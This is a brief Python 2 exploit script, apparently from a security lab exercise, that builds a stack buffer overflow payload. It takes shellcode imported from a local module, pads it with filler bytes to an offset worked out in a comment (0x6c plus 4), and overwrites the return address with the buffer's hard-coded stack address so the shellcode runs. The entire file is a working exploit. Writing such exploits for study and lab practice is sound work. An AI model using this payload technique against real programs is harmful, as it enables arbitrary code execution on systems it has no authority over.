from shellcode import shellcode
from struct import pack

'''
buffer starts at 0xbffeafac (ebp - 6c) = bffeb018 - 6c
6c = 108
so we want to enter 108 - however shellcode length + 4 to get from esp to ebp offset


'''
print shellcode+ "\xaa"*(4 + 0x6c-len(shellcode)) + pack("<I", 0xbffeafac)
